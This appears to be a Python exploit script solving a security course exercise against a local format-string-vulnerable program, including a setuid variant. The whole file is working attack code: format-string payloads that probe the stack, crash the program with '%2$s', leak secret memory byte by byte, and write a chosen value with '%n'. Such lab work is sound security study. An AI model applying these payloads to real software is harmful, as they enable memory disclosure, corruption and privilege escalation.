#!/usr/bin/python
import pexpect
import signal

SIGNALS_TO_NAMES_DICT = dict((getattr(signal, n), n) \
    for n in dir(signal) if n.startswith('SIG') and '_' not in n )

use_setuid_version = True
if use_setuid_version:
    program_name = "./formatstr-root"
else:
    program_name = "./formatstring"

print "Using program: " + program_name
print

def consume_line(p):
    return p.readline()[:-2] #last two chars \r\n

def read_and_print(p):
    line = consume_line(p)
    print line
    return line

def run(int_input=-1, offset=0, silent=False):
    p = pexpect.spawn(program_name)

    if not silent:
        read_and_print(p)
        read_and_print(p)
        line = read_and_print(p)
        read_and_print(p)
    else:
        consume_line(p)
        consume_line(p)
        line = consume_line(p)
        consume_line(p)

    secret_addr_str = line[line.find("0x")+2:line.find(" (on heap)")]

    if secret_addr_str[0] == ' ':
        secret_addr_str = secret_addr_str[1:]

    secret0_addr = int(secret_addr_str, 16)
    secret1_addr = secret0_addr + 4

    if not silent: #enter decimal integer
        read_and_print(p)
    else:
        consume_line(p)

    if int_input == -1:
        int_input = secret0_addr
    send_int = int_input + offset
    if not silent:
        print "Sending integer: " + str(send_int) + " hex: " + str(hex(send_int))
    p.sendline(str(send_int))   #send address of secret[0]

    if not silent: #output of sendline and enter a string
        read_and_print(p)
        read_and_print(p)
    else:
        consume_line(p)
        consume_line(p)

    return p, secret0_addr, secret1_addr

def inject(payload, silent=False):
    if not silent:
        print "Sending payload: \"" + payload + "\""

    p.sendline(payload)

    if not silent: #output of sendline
        read_and_print(p)
    else:
        consume_line(p)

#search for stack position of input integer (sii)
print "---------------------------------------------------------------------"
print "Preparation: search for stack position of input integer..."
int_input_signature  = 13371337
print "Integer signature: " + str(int_input_signature)
p, _, _ = run(int_input_signature, 0, False)
inject("%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d", False)
line = read_and_print(p) #payload result
sii = 1 + line.split(",").index(str(int_input_signature))
print "Stack position of integer input: " + str(sii)
p.close()
print

#crash program
print "---------------------------------------------------------------------"
print "Part 1a) Crash the program"
p, _, _ = run(0, False)
inject("%2$s")
p.close()
print "Program exits with signal: " + str(p.signalstatus) + " (" + SIGNALS_TO_NAMES_DICT[p.signalstatus] + ")"
print

#use found positions to manipulate data
print "---------------------------------------------------------------------"
print "Part 1b) Read secret[0] and secret[1]"
print "Sending multiple payloads to read one byte at a time..."
secret_bytes = [''] * 8
for i in range(8):
    p, _, _ = run(-1, i, True)
    inject("%" + str(sii) + "$.1s", True)
    line = consume_line(p).encode('ascii')   #payload result
    if len(line) > 0:
        byte_val = str(hex(ord(line[0])))
    else:
        byte_val = str(hex(0))

    # print "Byte[" + str(i) + "]: " + str(byte_val) + " hex: " + str(hex(byte_val))
    secret_bytes[i] = byte_val
    p.close()

secret_bytes.reverse() #litte-endian assuming x86

print "Found secret[0]: " + ' '.join(secret_bytes[0:4])
print "Found secret[1]: " + ' '.join(secret_bytes[4:8])
print "The above have been reversed from the x86 little-endian arrangement."
print

#write arbitrary data into secrets[1]
print "---------------------------------------------------------------------"
write_val = 0x77
print "Part 1c/d) Write a value (" + '0x{:02x}'.format(write_val) + ") to secret[1]"
p, secret0_addr, secret1_addr = run(-1, 4)
inject("%" + str(write_val) + ".0s%" + str(sii) + "$n")
read_and_print(p) #payload result
read_and_print(p) #payload result
read_and_print(p) #payload result
p.close()